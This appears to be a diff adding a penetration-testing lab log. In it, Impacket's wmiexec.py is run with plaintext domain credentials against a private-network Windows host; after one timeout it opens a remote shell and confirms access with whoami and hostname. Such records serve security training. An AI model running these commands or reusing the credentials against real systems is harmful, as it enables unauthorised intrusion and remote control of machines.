@@ -1,0 +1,23 @@
+┌──(root㉿PJZ)-[/home/projectzeus]
+└─# wmiexec.py spectra.local/dadam:Password1@192.168.177.129
+/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20210704.162046.29ad5792', 'wmiexec.py')
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[-] [Errno Connection error (192.168.177.129:445)] timed out
+┌──(root㉿PJZ)-[/home/projectzeus]
+└─# wmiexec.py spectra.local/dadam:Password1@192.168.177.129
+/usr/local/bin/wmiexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  __import__('pkg_resources').run_script('impacket==0.9.24.dev1+20210704.162046.29ad5792', 'wmiexec.py')
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+spectra\dadam
+
+C:\>hostname
+DR-ADAM
+
+C:\>
